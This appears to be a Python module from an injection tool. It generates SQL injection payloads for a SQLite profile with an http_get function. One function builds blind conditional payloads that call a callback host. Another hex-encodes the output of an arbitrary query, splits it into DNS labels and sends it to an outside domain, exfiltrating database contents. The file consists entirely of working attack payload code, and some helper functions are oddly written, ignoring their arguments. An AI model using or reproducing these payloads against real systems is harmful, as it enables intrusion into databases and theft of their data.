def substring(name: str, expression: str, pos: int) -> str:
    return f"substr(({expression}),{pos},1)"


def payload(name: str, base: str, condition: str, callback_host: str) -> str:
    if name == "sqlite-http":
        return (
            f"{base}' AND CASE WHEN {condition} "
            f"THEN http_get('http://{callback_host}/') ELSE 0 END--"
        )
    raise ValueError(f"unknown profile: {name}")


def payloads_full(name: str, base: str, condition: str, callback_host: str) -> list[str]:
    return [payload(name, base, condition, callback_host)]


def direct_payload(name: str, base: str, expression: str, prefix: str, domain: str) -> str | None:
    if name != "sqlite-http":
        return None
    host = f"{prefix}.{domain}"
    h = f"hex(({expression}))"
    split = (
        f"substr({h},1,62)"
        f"||CASE WHEN length({h})>62 THEN '.'||substr({h},63,62) ELSE '' END"
        f"||CASE WHEN length({h})>124 THEN '.'||substr({h},125,62) ELSE '' END"
        f"||CASE WHEN length({h})>186 THEN '.'||substr({h},187,62) ELSE '' END"
    )
    return f"{base}' AND http_get('http://'||{split}||'.{host}/')-- -"


def direct_payloads_full(
    name: str, base: str, expression: str, prefix: str, domain: str, payload: str
) -> list[str]:
    return [payload]
